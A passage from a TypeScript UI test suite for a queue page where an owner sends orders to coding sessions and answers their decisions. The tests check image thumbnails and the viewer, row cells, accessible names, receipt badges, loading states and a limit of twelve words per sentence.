    const isDone = await (module.sendMessageQ as (deps: unknown) => Promise<boolean>)({
      body: { sessionIds: [SESSION_ID], text: "rebase on main" }, names: ["gersona"], shots: [failed],
      setComposer: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { composer = next(composer); }, setStatus: () => undefined, onSent: () => undefined,
    });
    assert.deepEqual([isDone, posts.length, (getPlain(composer) as { text: string; isBusy: boolean }).text, (getPlain(composer) as { isBusy: boolean }).isBusy], [false, 0, "rebase on main", false]);
  });
});

describe("images in an order's bubble", () => {
  const images = [0, 1, 2].map((index) => ({ id: IMAGE_ID[index], name: `shot-${index + 1}.png`, type: "png", bytes: 1258291, width: 2880, height: 1800 }));
  const order = buildItem({ id: 81, kind: "message", title: "Order", body: "see the red box", options: [], status: "delivered", answeredAt: "2026-11-13T05:40:00.000Z", attachments: images });

  test("the images sit inside the bubble under the text, each a button naming its place and file that opens the viewer at it", () => {
    const opened: unknown[] = [];
    const tree = render("OrderEntryQ", { entry: { id: 81, item: order, copies: [order] }, onResend: () => undefined, onOpenImage: (...args: unknown[]) => opened.push(args) });
    const [bubble] = findNodes(tree, (node) => String(node.props?.className).startsWith("queue-bubble"));
    assert.ok(bubble, "bubble rendered");
    const buttons = findNodes(bubble as RenderedNode, (node) => node.type === "button" && /^Open image /.test(String(node.props["aria-label"])));
    assert.deepEqual(buttons.map((node) => node.props["aria-label"]), ["Open image 1 of 3: shot-1.png", "Open image 2 of 3: shot-2.png", "Open image 3 of 3: shot-3.png"]);
    assert.deepEqual(findNodes(bubble as RenderedNode, (node) => node.type === "img").map((node) => node.props.src), images.map((image) => `/api/queue/owner/images/${image.id}`));
    (buttons[1]?.props.onClick as () => void)();
    assert.deepEqual(getPlain(opened), [[images, 1]]);
  });

  test("an order with no images draws no image row", () => {
    const tree = render("OrderEntryQ", { entry: { id: 82, item: { ...order, attachments: [] }, copies: [order] }, onResend: () => undefined, onOpenImage: () => undefined });
    assert.equal(findNodes(tree, (node) => node.type === "img").length, 0);
  });

  test("the viewer shows one image fitted in the fullscreen surface with its name, size and place", () => {
    const tree = render("ImageViewerQ", { images, index: 1, onStep: () => undefined, onClose: () => undefined });
    const [surface] = findNodes(tree, (node) => node.props?.atom === "DetailSurface");
    assert.equal(surface?.props.variant, "fullscreen");
    assert.deepEqual(findNodes(tree, (node) => node.type === "img").map((node) => [node.props.src, node.props.alt]), [[`/api/queue/owner/images/${IMAGE_ID[1]}`, "shot-2.png"]]);
    assert.ok(collectText(tree).includes("shot-2.png · 1.2 MB · 2 of 3"), collectText(tree));
  });

  // spec §9.8 → Opening one large: Left / Right step through one order's images and stop at its ends
  const steps = [
    { name: "Right moves to the next", index: 0, key: "ArrowRight", next: 1 },
    { name: "Left moves to the previous", index: 2, key: "ArrowLeft", next: 1 },
    { name: "Right on the last stays", index: 2, key: "ArrowRight", next: null },
    { name: "Left on the first stays", index: 0, key: "ArrowLeft", next: null },
    { name: "another key does not step", index: 1, key: "ArrowDown", next: null },
  ];
  for (const row of steps) test(`viewer keys: ${row.name}`, () => assert.equal(call("getSteppedIndexQ", row.index, 3, row.key), row.next));
});

// spec §7, §9.8 → On an answer → Afterwards: the images the session received, under Your answer, on the sheet in delivery and once handled
describe("images on an answer", () => {
  const images = [0, 1].map((index) => ({ id: IMAGE_ID[index], name: `shot-${index + 1}.png`, type: "png", bytes: 1258291, width: 2880, height: 1800 }));
  const answered = (overrides: Record<string, unknown>) => buildItem({ status: "answered", answer: { code: "R1", text: "after the deploy" }, answeredAt: "2026-11-12T12:26:40.118Z", attachments: images, ...overrides });
  const reference = "Reference only — not part of the approval.";

  const rows = [
    { name: "a plain decision's answer shows its thumbnails with no reference line", item: answered({}), opens: ["Open image 1 of 2: shot-1.png", "Open image 2 of 2: shot-2.png"], hasReference: false },
    { name: "an approval's answer shows its thumbnails and the reference line", item: answered({ isApprovalClass: true }), opens: ["Open image 1 of 2: shot-1.png", "Open image 2 of 2: shot-2.png"], hasReference: true },
    { name: "a handled approval's answer keeps its thumbnails and the reference line", item: answered({ isApprovalClass: true }), isDone: true, opens: ["Open image 1 of 2: shot-1.png", "Open image 2 of 2: shot-2.png"], hasReference: true },
    { name: "an answer with no images draws no row and no reference line", item: answered({ isApprovalClass: true, attachments: [] }), opens: [], hasReference: false },
  ];
  for (const row of rows) {
    test(`under Your answer: ${row.name}`, () => {
      const tree = render("YourAnswerQ", { item: row.item, isDone: row.isDone });
      const opens = findNodes(tree, (node) => node.type === "button" && /^Open image /.test(String(node.props["aria-label"])));
      assert.deepEqual([opens.map((node) => node.props["aria-label"]), findNodes(tree, (node) => node.type === "img").map((node) => node.props.src), collectText(tree).includes(reference)],
        [row.opens, row.opens.map((_, index) => `/api/queue/owner/images/${IMAGE_ID[index]}`), row.hasReference]);
    });
  }

  test("an answered decision's images ride its row's title and accessible name, its fact column unchanged", () => {
    const item = answered({});
    assert.deepEqual(call("getRowCellsQ", { item, copies: [item] }, false), { tags: [], fact: "Answer R1", extras: ["2 images"] });
  });
});

// spec §5 → Where it renders: each surface's text through ProseText, its fence fold on only where the table folds (C-no-fold-on-decisions)
describe("which text surfaces fold a long fence", () => {
  const answered = { status: "answered", answer: { code: "R1", text: "after the deploy" }, answeredAt: "2026-11-12T12:26:40.118Z", attachments: [] };
  const report = { kind: "report", body: "Shipped.", options: null, recommendedCode: null };
  const handled = { status: "seen", closedAt: "2026-11-12T13:00:00.000Z" };
  const order = buildItem({ ...report, status: "answered", answer: { code: null, text: "ship it" }, answeredAt: "2026-11-12T12:26:40.118Z", sendId: "s" });
  const rows = [
    { name: "an open decision's text stays whole", item: buildItem(), folds: [["Two orders keep the shadow DB green.", false]] },
    { name: "an open approval-class decision's text stays whole", item: buildItem({ isApprovalClass: true }), folds: [["Two orders keep the shadow DB green.", false]] },
    { name: "In delivery: the owner's answer and the folded question both stay whole", item: buildItem(answered), folds: [["after the deploy", false], ["Two orders keep the shadow DB green.", false]] },
    { name: "a handled answered decision: the owner's answer folds, the question stays whole", item: buildItem({ ...answered, ...handled, status: "delivered" }), isDone: true, folds: [["after the deploy", true], ["Two orders keep the shadow DB green.", false]] },
    { name: "a handled decision that ended unanswered keeps its question whole", item: buildItem({ ...handled, status: "withdrawn" }), isDone: true, folds: [["Two orders keep the shadow DB green.", false]] },
    { name: "an open report's text folds", item: buildItem(report), folds: [["Shipped.", true]] },
    { name: "a handled report's text folds", item: buildItem({ ...report, ...handled }), isDone: true, folds: [["Shipped.", true]] },
  ];
  const getFolds = (tree: RenderedNode) => findNodes(tree, (node) => node.props?.atom === "ProseText").map((node) => [node.props.text, node.props.canFoldCode]);
  for (const row of rows) {
    test(`on the sheet: ${row.name}`, () => {
      assert.deepEqual(getFolds(renderSheet({ item: row.item, queue: buildQueue().queue, cliPath: CLI_PATH, isDone: row.isDone ?? false })), row.folds);
    });
  }

  test("in Orders: the owner's text in its bubble folds", () => {
    const tree = render("OrderEntryQ", { entry: { id: 81, item: order, copies: [order] }, onResend: () => undefined, onOpenImage: () => undefined });
    assert.deepEqual(getFolds(tree), [["ship it", true]]);
  });
});

// the review of the built page against mockup v5 and spec 44063 (§4.2, §4.3, §7, §9.1–§9.4, §10)
describe("marks and counts on the desk", () => {
  test("the All sessions band shows no count at zero, and a failed receipt as the warn mark in its tag column, named and titled by its count", () => {
    const bandOf = (notReceived: number, awaiting: number) => render("AllSessionsBandQ", {
      rows: [buildSessionRow({ count: { awaiting, inDelivery: 0 } })], sessions: { selectedIds: [], setSelectedIds: () => undefined },
      view: { scope: "" }, notReceived, onScope: () => undefined,
    });
    const badges = (tree: RenderedNode) => findNodes(tree, (node) => node.props?.atom === "Badge").map((node) => ({ text: collectText(node).replace(/\s+/g, " ").trim(), title: node.props.title }));
    assert.deepEqual(badges(bandOf(0, 0)), []);
    const [tag] = findNodes(bandOf(1, 3), (node) => String(node.props?.className ?? "").startsWith("queue-rail-tag"));
    const [mark] = findNodes(tag as RenderedNode, (node) => node.props?.role === "img");
    assert.deepEqual([badges(bandOf(1, 3)), mark?.props["aria-label"], mark?.props.title], [[{ text: "3", title: undefined }], "1 not received", "1 not received"]);
  });

  test("the nav item carries no badge while nothing waits and nothing deviates", () => {
    const ready = (awaiting: number, deviations: number) => ({ status: "ready", data: { awaiting, deviations } });
    assert.deepEqual([call("getQueueNavBadge", ready(0, 0)), Object.keys(call("getQueueNavBadge", ready(0, 1)))], [{}, ["queue"]]);
  });
});

describe("In delivery rows", () => {
  const answered = (status: string, overrides: Record<string, unknown> = {}) => buildItem({ status, answer: { code: "R1" }, answeredAt: "2026-11-12T12:26:40.118Z", ...overrides });
  const rows = [
    { name: "a copy not yet received shows the route word alone", item: answered("answered"), cells: { tags: [], fact: "Answer R1", extras: [] } },
    { name: "a copy not received counts one in the tag column", item: answered("unacked", { canResend: true }), cells: { tags: [{ glyph: "warn", count: 1, word: "1 not received" }], fact: "Answer R1", extras: [] } },
    {
      name: "a copy whose session does not listen counts one next turn in the tag column",
      item: answered("answered", { session: buildSession({ state: "live", isWaiting: false }) }),
      cells: { tags: [{ glyph: "pause", count: 1, word: "1 next turn" }], fact: "Answer R1", extras: [] },
    },
    {
      name: "an order's images and the account ride only the row's title and accessible name",
      item: buildItem({ kind: "message", status: "answered", answeredAt: "2026-11-12T12:26:40.118Z", attachments: [{ id: 1 }, { id: 2 }] }),
      isAccountShown: true,
      cells: { tags: [], fact: "Order", extras: ["work-dev", "2 images"] },
    },
  ];
  for (const row of rows) test(row.name, () => assert.deepEqual(call("getRowCellsQ", { item: row.item, copies: [row.item] }, row.isAccountShown ?? false), row.cells));

  test("an order to several sessions all still waiting reads none received and draws no tag", () => {
    const copies = ["answered", "delivering"].map((status, index) => buildItem({ id: 90 + index, kind: "message", status, sendId: "send-1", answeredAt: "2026-11-12T12:26:40.118Z" }));
    assert.deepEqual(call("getRowCellsQ", { item: copies[0], copies }, false), { tags: [], fact: "0 of 2", extras: [] });
  });

  // spec §4.2: one line on fixed columns — every cell drawn in its place, an empty one too, so no text ends where a tag starts
  test("a row lays its cells in column order, name, title, tag, fact, age, chevron, an empty tag and fact cell included", () => {
    const view = { isNameShown: true, isAccountShown: false, tabStopId: 41 };
    const tree = render("QueueRowQ", { row: call("getSingleRowQ", buildItem({ kind: "report", session: buildSession({ name: "gersona" }) })), isSelected: false, cols: ["tag", "fact"], view, onSelect: () => undefined, onOrder: () => undefined });
    const [option] = findNodes(tree, (node) => node.props?.role === "option");
    const slots = (option?.children ?? []).flatMap((child) => (typeof child === "object" && child !== null ? [String((child as RenderedNode).props?.className ?? "")] : []));
    const empty = ["queue-row-tag", "queue-row-fact"].map((name) => collectText(byClass(tree, name)[0] as RenderedNode));
    assert.deepEqual([slots, collectText(byClass(tree, "queue-row-who")[0] as RenderedNode), empty], [["queue-row-who", "queue-row-title", "queue-row-tag", "queue-row-fact", "queue-row-age", "queue-row-chevron"], "gersona self", ["", ""]]);
  });

  // spec §4.2: what is off the row — the account, a name's start-directory mark — stays in the row's title and accessible name
  test("a row's title and accessible name carry its fact, the account and a start directory's mark", () => {
    const view = { isNameShown: true, isAccountShown: true, tabStopId: 41 };
    const item = buildItem({ isApprovalClass: true, session: buildSession({ name: "gersona", isNameRegistered: false }) });
    const [option] = findNodes(render("QueueRowQ", { row: call("getSingleRowQ", item), isSelected: false, cols: ["tag", "fact"], view, onSelect: () => undefined, onOrder: () => undefined }), (node) => node.props?.role === "option");
    assert.deepEqual(
      [option?.props.title, String(option?.props["aria-label"]).replace(/posted .*$/, "posted")],
      ["2 options · work-dev · start directory", `Decision from gersona: ${item.title}, Approval, 2 options, work-dev, start directory, posted`],
    );
  });

  test("with exactly one session ticked a row paints no name column", () => {
    const view = { isNameShown: false, isAccountShown: false, tabStopId: 41 };
    const tree = render("QueueRowQ", { row: call("getSingleRowQ", buildItem({ session: buildSession({ name: "gersona" }) })), isSelected: false, cols: ["tag", "fact"], view, onSelect: () => undefined, onOrder: () => undefined });
    assert.deepEqual([byClass(tree, "queue-row-who").length, collectText(tree).includes("gersona")], [0, false]);
  });

  // spec §4.4: an arrival carries no mark of its own — no badge on its face, no New in its name
  test("an arrived row paints no badge and its name has no New", () => {
    const view = { isNameShown: true, isAccountShown: false, tabStopId: 41 };
    const tree = render("QueueRowQ", { row: call("getSingleRowQ", buildItem({ kind: "report" })), isSelected: false, cols: ["tag", "fact"], isNew: true, view, onSelect: () => undefined, onOrder: () => undefined, onSeen: () => undefined });
    const [option] = findNodes(tree, (node) => node.props?.role === "option");
    assert.deepEqual([findNodes(tree, (node) => node.props?.atom === "Badge").length, /\bNew\b/.test(String(option?.props["aria-label"]))], [0, false]);
  });

  // spec §4.2: the name column holds one line — a start directory's mark rides the row's title; one name stands for one session alone
  const whoRows = [
    { name: "an unregistered name of one session stands alone on its line", session: { name: "atrium-hooks", isNameRegistered: false }, copies: 1, lines: ["atrium-hooks"] },
    { name: "an order to several sessions names their count, never a directory", session: { name: "atrium-hooks", isNameRegistered: false }, copies: 2, lines: ["2 sessions"] },
  ];
  for (const row of whoRows) {
    test(`row name column: ${row.name}`, () => {
      const item = buildItem({ kind: "message", sendId: "send-1", session: buildSession(row.session) });
      const copies = Array.from({ length: row.copies }, (_, index) => ({ ...item, id: item.id + index }));
      const tree = render("RowWhoQ", { row: { id: item.id, item, copies } });
      assert.deepEqual(findNodes(tree, (node) => typeof node.props?.className === "string" && node.props.className.startsWith("queue-row-")).map((node) => collectText(node)), row.lines);
    });
  }

  // one row rule: every name a session wrote for itself takes the page's own mark beside it, never in it; a start directory, an id or a count never
  const relay398 = getRelayThreadFixture().items.find((copy) => copy.id === 398)!;
  const markedCell = (name: string) => ({ name, tip: `${name} (self-named)`, mark: { text: "self", tip: "self-named", isHidden: true }, isMarkInName: false });
  const unmarkedCell = (name: string) => ({ name, tip: name, mark: undefined, isMarkInName: false });
  const rowMarks = [
    { name: "a decision from a registered name", item: buildItem({ session: buildSession({ name: "atrium" }) }), copies: 1, cell: markedCell("atrium") },
    { name: "a report from a registered name", item: buildItem({ kind: "report", session: buildSession({ name: "atrium" }) }), copies: 1, cell: markedCell("atrium") },
    { name: "a relay from a registered sender", item: relay398, copies: 1, cell: markedCell("atrium") },
    { name: "a decision from a start-directory name", item: buildItem({ session: buildSession({ name: "atrium-hooks", isNameRegistered: false }) }), copies: 1, cell: unmarkedCell("atrium-hooks") },
    { name: "a relay from a sender that registered none", item: { ...relay398, relay: { ...relay398.relay!, sender: { ...relay398.relay!.sender, selfDeclaredName: null } } }, copies: 1, cell: unmarkedCell(relay398.relay!.sender.sessionIdPrefix) },
    { name: "an order to several registered sessions", item: buildItem({ kind: "message", sendId: "send-1" }), copies: 2, cell: unmarkedCell("2 sessions") },
  ];
  for (const row of rowMarks) {
    test(`row self mark: ${row.name}`, () => {
      const copies = Array.from({ length: row.copies }, (_, index) => ({ ...row.item, id: row.item.id + index }));
      const tree = render("RowWhoQ", { row: { id: 1, item: row.item, copies } });
      const [name] = byClass(tree, "queue-row-name");
      const [mark] = byClass(tree, "queue-row-mark");
      const isMarkInName = mark !== undefined && name !== undefined && findNodes(name, (node) => node === mark).length > 0;
      assert.deepEqual({ name: collectText(name!), tip: name?.props.title, mark: mark && { text: collectText(mark), tip: mark.props.title, isHidden: mark.props["aria-hidden"] === "true" }, isMarkInName }, row.cell);
    });
  }

  // the row's accessible name replaces its children → it says the mark in words, and a start directory as its own fact
  const rowLabels = [
    { name: "a registered decision", item: buildItem(), label: "Decision from glass-atrium (self-named): Pick the migration order" },
    { name: "a registered report", item: buildItem({ kind: "report", title: "Nightly sweep done" }), label: "Report from glass-atrium (self-named): Nightly sweep done" },
    { name: "a start-directory decision", item: buildItem({ session: buildSession({ isNameRegistered: false }) }), label: "Decision from glass-atrium: Pick the migration order" },
  ];
  for (const row of rowLabels) {
    test(`row accessible name: ${row.name} reads its sender as the mark says`, () => {
      const view = { isNameShown: true, isAccountShown: false, tabStopId: 41 };
      const [option] = findNodes(render("QueueRowQ", { row: call("getSingleRowQ", row.item), isSelected: false, cols: ["tag", "fact"], view, onSelect: () => undefined, onOrder: () => undefined }), (node) => node.props?.role === "option");
      const label = String(option?.props["aria-label"]);
      assert.deepEqual([label.split(", ")[0], label.includes("start directory")], [row.label, row.item.session.isNameRegistered === false]);
    });
  }
});

describe("the sheet's letterhead and record", () => {
  const item = buildItem({ status: "unacked", canResend: true, answer: { code: "R1" }, answeredAt: "2026-11-12T12:26:40.118Z", answerRecord: { route: "answer", signal: "fetch_metadata" }, session: buildSession({ name: "aidl", state: "live" }) });

  test("an answered decision's date line holds the receipt badge alone", () => {
    const facts = findNodes(render("LetterheadFactsQ", { item }), (node) => node.props?.atom === "Badge").map((node) => collectText(node));
    assert.deepEqual([facts, collectText(render("LetterheadFactsQ", { item })).includes("Answer R1")], [["Not received"], false]);
  });

  test("the date line's time reads the spec's dated form and its title carries the answer record", () => {
    const tree = render("LetterheadTimeQ", { item });
    const [time] = findNodes(tree, (node) => typeof node.props?.title === "string");
    assert.equal(time?.props.title, "Answered 2026-11-12 21:26 KST through the monitor (same-origin request)");
    assert.ok(collectText(tree).endsWith("2026-11-12 21:26 KST"), collectText(tree));
  });

  test("the sheet's date line comes first in its body: the facts, then the time", () => {
    const tree = renderSheet({ item, queue: buildQueue().queue });
    const [line] = byClass(tree, "queue-date-line");
    const [body] = byClass(tree, "queue-sheet-body");
    assert.deepEqual([body?.children[0] === line, collectText(line as RenderedNode).replace(/\s+/g, " ").trim()], [true, "Not received Answered 2026-11-12 21:26 KST"]);
  });

  test("the sheet's head holds the way back, the kind tag and name as its h2, the position and the stepping", () => {
    const { calls, queue } = buildQueue({ steps: { index: 0, count: 8, prevId: null, nextId: 7 } });
    const tree = renderSheet({ item: buildItem(), queue });
    const [head] = byClass(tree, "card-head");
    const buttons = findNodes(head as RenderedNode, (node) => node.type === "button");
    for (const button of buttons) if (!button.props.disabled) (button.props.onClick as () => void)();
    assert.deepEqual(buttons.map((button) => [button.props["aria-label"], button.props.title, Boolean(button.props.disabled)]), [["Back to the list", "Back to the list (Esc)", false], ["Previous item", "Previous item (K)", true], ["Next item", "Next item (J)", false]]);
    assert.equal(collectText(findNodes(head as RenderedNode, (node) => node.type === "h2")[0] as RenderedNode).replace(/\s+/g, " ").trim(), "Decision from glass-atrium (self-named)");
    assert.ok(collectText(head as RenderedNode).includes("1 of 8"));
    assert.deepEqual(getPlain(calls), [["back"], ["selectRow", 7]]);
  });

  // the count rides the back control's name; its painted badge stands beside the glyph-only square, hidden from the name's reader
  test("rows that arrived while the sheet is open are counted on the way back, in its name and in a badge beside it", () => {
    const { queue } = buildQueue({ list: { status: "ready", data: { items: [], nextCursor: null }, newIds: [50, 51] } });
    const [head] = byClass(renderSheet({ item: buildItem(), queue }), "card-head");
    const [back] = findNodes(head as RenderedNode, (node) => node.type === "button" && /^Back to the list/.test(String(node.props["aria-label"])));
    const hidden = findNodes(head as RenderedNode, (node) => node.props?.["aria-hidden"] === "true" && findNodes(node, (child) => child.props?.atom === "Badge").length > 0);
    assert.deepEqual(
      [back?.props["aria-label"], findNodes(back as RenderedNode, (node) => node.props?.atom === "Badge").length, hidden.map((node) => collectText(node))],
      ["Back to the list, 2 new in the list", 0, ["2"]],
    );
  });

  // spec §12.5: a glyph-only control → no text on its face, one glyph, the act in its name, the name and its key in its tooltip
  const iconControls = [
    { name: "the way back", tree: () => renderSheet({ item: buildItem(), queue: buildQueue().queue }), label: "Back to the list", glyph: "arrow-left", title: "Back to the list (Esc)" },
    { name: "the previous item", tree: () => renderSheet({ item: buildItem(), queue: buildQueue({ steps: { index: 1, count: 3, prevId: 5, nextId: 7 } }).queue }), label: "Previous item", glyph: "chevron-up", title: "Previous item (K)" },
    { name: "the next item", tree: () => renderSheet({ item: buildItem(), queue: buildQueue({ steps: { index: 1, count: 3, prevId: 5, nextId: 7 } }).queue }), label: "Next item", glyph: "chevron-down", title: "Next item (J)" },
    { name: "the viewer's previous image", tree: () => renderViewer(), label: "Previous image", glyph: "chevron-left", title: "Previous image (←)" },
    { name: "the viewer's next image", tree: () => renderViewer(), label: "Next image", glyph: "chevron-right", title: "Next image (→)" },
    { name: "the viewer's close", tree: () => renderViewer(), label: "Close", glyph: "x", title: "Close (Esc)" },
  ];
  for (const row of iconControls) {
    test(`${row.name} is a ghost icon button: one glyph, no text, named for its act, its tooltip the name and its key`, () => {
      const [button] = findNodes(row.tree(), (node) => node.type === "button" && node.props["aria-label"] === row.label);
      const classes = String(button?.props.className ?? "").split(" ");
      const glyphs = findNodes(button as RenderedNode, (node) => node.props?.atom === "Icon").map((node) => node.props.name);
      assert.deepEqual([classes.includes("ghost") && classes.includes("icon"), collectText(button as RenderedNode).trim(), glyphs, button?.props.title], [true, "", [row.glyph], row.title]);
    });
  }

  // spec §9.8 / §12.5: re-sending a file is a re-send → it keeps its word, the quiet tier, never a bare glyph
  test("a failed upload's Try again is a quiet word button: its word on its face and no glyph", () => {
    const tree = render("ImageFailureLineQ", { text: "shot-3.png could not be uploaded.", retryId: "box-retry", onRetry: () => undefined });
    const [button] = findNodes(tree, (node) => node.type === "button");
    const classes = String(button?.props.className ?? "").split(" ");
    assert.deepEqual([classes.includes("ghost"), classes.includes("icon"), collectText(button as RenderedNode).trim(), findNodes(button as RenderedNode, (node) => node.props?.atom === "Icon").length], [true, false, "Try again", 0]);
  });

  // the session's facts ride its name; the id or the account shows only while it tells two loaded sessions apart
  const twin = buildSession({ id: "b7c6d5e4-0000-4000-8000-000000000001" });
  const elsewhere = buildSession({ id: "c1d2e3f4-0000-4000-8000-000000000002", name: "aidl", profileLabel: ".claude-personal" });
  const nameRows = [
    { name: "a name no other loaded session carries stands alone", items: [buildItem()], expected: "glass-atrium (self-named)" },
    { name: "a name two loaded sessions share takes the 8-character id", items: [buildItem(), buildItem({ id: 42, session: twin })], expected: "glass-atrium (self-named) · 6f1c2a9e" },
    { name: "items from more than one account add the account", items: [buildItem(), buildItem({ id: 42, session: elsewhere })], expected: "glass-atrium (self-named) · work-dev" },
  ];
  for (const row of nameRows) {
    test(`the sheet's session name: ${row.name}`, () => {
      const { queue } = buildQueue({ list: { status: "ready", data: { items: row.items, nextCursor: null }, newIds: [] } });
      const [name] = byClass(renderSheet({ item: row.items[0], queue }), "queue-letter-name");
      assert.equal(collectText(name as RenderedNode).replace(/\s+/g, " ").trim(), row.expected);
    });
  }

  // the head is where the owner acts → a registered name is said as the session's own writing, by a page-drawn element beside the name, never in it
  const headRows = [
    { name: "a registered decision", item: buildItem(), head: "Decision from glass-atrium (self-named)", suffix: "(self-named)" },
    { name: "a registered report", item: buildItem({ kind: "report" }), head: "Report from glass-atrium (self-named)", suffix: "(self-named)" },
    { name: "a start-directory decision", item: buildItem({ session: buildSession({ isNameRegistered: false }) }), head: "Decision from glass-atrium start directory", suffix: null },
  ];
  for (const row of headRows) {
    test(`the sheet's head: ${row.name} reads as its name says who wrote it`, () => {
      const [head] = byClass(renderSheet({ item: row.item, queue: buildQueue().queue }), "card-head");
      const [h2] = findNodes(head as RenderedNode, (node) => node.type === "h2");
      const [name] = byClass(head as RenderedNode, "queue-letter-text");
      const suffixes = findNodes(head as RenderedNode, (node) => collectText(node).trim() === "(self-named)" && typeof node.props?.className === "string");
      const isSuffixInName = suffixes.some((suffix) => name !== undefined && findNodes(name, (node) => node === suffix).length > 0);
      assert.deepEqual(
        [collectText(h2 as RenderedNode).replace(/\s+/g, " ").trim(), suffixes.map((suffix) => collectText(suffix).trim())[0] ?? null, isSuffixInName],
        [row.head, row.suffix, false],
      );
    });
  }

  test("the record is no visible line, and a not received answer says why and what to run", () => {
    const text = collectText(render("CardStateQ", { item, cliPath: CLI_PATH }));
    assert.ok(!text.includes("same-origin") && text.includes("aidl did not acknowledge it") && text.includes(`${CLI_PATH} pending`), text);
  });

  test("the folded question opens on the system chevron", () => {
    const [summary] = findNodes(render("OriginalQuestionQ", { item }), (node) => node.type === "summary");
    assert.ok(findNodes(summary as RenderedNode, (node) => node.props?.atom === "DisclosureChevron").length === 1);
  });
});

describe("loading and empty states", () => {
  test("each loading body names its source once and the list head counts nothing before the first read", () => {
    const { queue } = buildQueue();
    const loading = { ...withList(queue, []), list: { status: "loading", data: null, error: null, readAt: null, newIds: [] } };
    const [placeholder] = findNodes(render("ListBodyQ", { queue: loading, items: [], visible: [] }), (node) => node.props?.atom === "LoadingPlaceholder");
    const [card] = findNodes(render("QueueListQ", { queue: loading }), (node) => node.props?.atom === "Card");
    assert.deepEqual([placeholder?.props.label, card?.props.sub ?? null], ["the queue", null]);
  });

  test("an empty thread names the ticked sessions and asks for the first order", () => {
    const tree = render("ThreadEmptyQ", { names: ["aidl"] });
    const [empty] = findNodes(tree, (node) => node.props?.atom === "EmptyState");
    assert.deepEqual({ message: empty?.props.message, hint: empty?.props.hint }, { message: "No orders to aidl yet", hint: "Write the first one below." });
  });

  test("a refusal reason that ends its own sentence gets no second period", () => {
    assert.equal(call("getRefusalReasonQ", { status: 409, data: { reason: "aidl ended, send again." } }), "Refused: aidl ended, send again.");
  });
});

describe("Orders after a send", () => {
  test("a taken send's status line carries the quiet Show to its order, and the box takes the focus back", async () => {
    const focused: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub(), document: { getElementById: (id: string) => ({ focus: () => focused.push(id) }) } },
      fetch: async () => ({ status: 201, json: async () => ({ sendId: "send-7", items: [{ id: 77, sessionId: SESSION_ID }] }) }),
    })) as ScreenModule;
    const statuses: unknown[] = [];
    await (module.sendMessageQ as (deps: unknown) => Promise<boolean>)({ body: { sessionIds: [SESSION_ID], text: "go" }, names: ["yoaida"], setComposer: () => undefined, setStatus: (next: unknown) => statuses.push(next), onSent: () => undefined });
    assert.deepEqual([getPlain(statuses), focused], [[{ text: "✓ Order sent to yoaida", orderId: 77 }], ["queue-order-text"]]);
  });

  test("of the sheet's acts only a sent report's line names an order, the report itself, so its Show opens it", () => {
    const report = buildItem({ id: 61, kind: "report", session: buildSession({ name: "yoaida" }) });
    const lines = ["seen", "reply", "later"].map((action) => call("getActionStatusQ", report, action));
    assert.deepEqual(lines, ["Marked as read", { text: "✓ Order sent to yoaida", orderId: 61 }, "Moved to the end of Reports"]);
  });

  test("a recipient's Resend is an edged small button", () => {
    const tree = render("RecipientRowQ", { copy: buildItem({ kind: "message", status: "unacked", canResend: true }), onResend: () => undefined });
    assert.deepEqual(buttonLabelled(tree, "Resend").map((node) => node.props.className), ["btn sm"]);
  });

  test("the thumbnails' count leaves out an image that failed to upload", () => {
    const shots = [{ status: "stored", bytes: 2048 }, { status: "failed", bytes: 139 * 1024 }];
    assert.deepEqual([call("getImageCountLineQ", shots), call("getImageCountLineQ", [shots[1]])], ["1 image · 2 KB", ""]);
  });

  test("the viewer is one picture over one foot bar: name · size · place, previous / next and Close", () => {
    const steps: unknown[] = [];
    const tree = renderViewer((next: unknown) => steps.push(next));
    const [surface] = findNodes(tree, (node) => node.props?.atom === "DetailSurface");
    for (const label of ["Previous image", "Next image"]) for (const button of findNodes(tree, (node) => node.props?.["aria-label"] === label)) (button.props.onClick as () => void)();
    const closes = findNodes(tree, (node) => node.type === "button" && node.props["aria-label"] === "Close");
    assert.deepEqual([surface?.props.bare, surface?.props.footer ?? null, steps, closes.length, collectText(tree).split("shot-2.png").length - 1], [true, null, [0, 2], 1, 1]);
  });
});

function renderViewer(onStep: (next: unknown) => unknown = () => undefined): RenderedNode {
  const images = IMAGE_ID.map((id, index) => ({ id, name: `shot-${index + 1}.png`, bytes: 1024 * 1024, width: 800, height: 600 }));
  return render("ImageViewerQ", { images, index: 1, onStep, onClose: () => undefined });
}

// the page's fixed sentences, as the page builds them
describe("twelve words a sentence", () => {
  const occupant = { profileLabel: "personal", cwdTail: "wt/owner-queue", sessionIdPrefix: "9b2e7c41" };
  const marked = (bgId: string | null) => buildSession({ marker: { setAt: "2026-11-10T06:20:11.204Z", bgId } });
  const noteOf = (item: unknown) => call<Array<Array<string | { machine: string }>>>("getCardNotesQ", item).map(getNoteText);
  const strings = () => [
    vm.runInContext("RAIL_HINT_Q.TEXT", screen) as string,
    vm.runInContext('DESK_KEY_LIST_Q.find((row) => row.keys === "Esc").does', screen) as string,
    ...findNodes(render("DeskKeysQ", { keys: { isOn: true, toggle: () => undefined } }), (node) => node.type === "p").map((node) => collectText(node)),
    ...noteOf(buildItem({ session: marked("bg-7f3a") })),
    ...noteOf(buildItem({ session: marked(null) })),
    ...noteOf(buildItem({ status: "resume_pending", skipReason: { kind: "shared_worktree", markedOccupants: [occupant], hasUnmarkedOccupant: false } })),
    ...findNodes(render("SheetFootQ", { item: buildItem({ isApprovalClass: true }), draft: {}, queue: buildQueue().queue, isBusy: false, error: null }), (node) => typeof node.children?.[0] === "string" && String(node.children[0]).startsWith("Approval:")).map((node) => collectText(node)),
    call<string>("getNextTurnSentenceQ", ["yoaida"], "this"),
    call<string>("getNextTurnSentenceQ", ["yoaida", "gersona"]),
    ...(vm.runInContext("Object.values(RELAY_REFUSAL_Q)", screen) as Array<[string, (names: unknown) => string]>)
      .map(([label, getSentence]) => `${label} — ${getSentence({ sender: "gersona", recipient: "yoaida" })}`),
    ...noteOf(buildItem({ status: "resume_pending", skipReason: { kind: "shared_worktree", markedOccupants: [], hasUnmarkedOccupant: true } })),
    collectText(render("AnswerLineQ", { item: buildItem({ status: "answered", isAnsweredOutside: true, answeredAt: "2026-11-19T05:30:00.000Z" }) })),
    vm.runInContext("RELAY_NO_LOGIN_Q", screen) as string,
  ];

  test("every sentence the page renders is twelve words or fewer", () => {
    const texts = strings();
    assert.deepEqual([texts.every((text) => text.length > 0), getLongSentences(texts)], [true, []], JSON.stringify(texts));
  });
});

